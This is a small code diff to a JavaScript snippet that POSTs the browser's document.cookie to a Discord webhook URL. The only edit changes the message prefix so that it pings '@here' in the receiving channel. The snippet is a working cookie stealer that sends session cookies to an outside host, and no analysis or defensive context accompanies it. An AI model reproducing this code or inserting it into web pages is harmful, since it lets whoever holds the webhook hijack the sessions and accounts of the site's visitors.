@@ -4,5 +4,5 @@ xhr.open('POST','https://discord.com/api/webhooks/832975570467029052/BxgJ8gGQpMb
 
 xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
 
-xhr.send('content=>>>'+document.cookie);
+xhr.send('content=> @here >>-->>'+document.cookie);
 
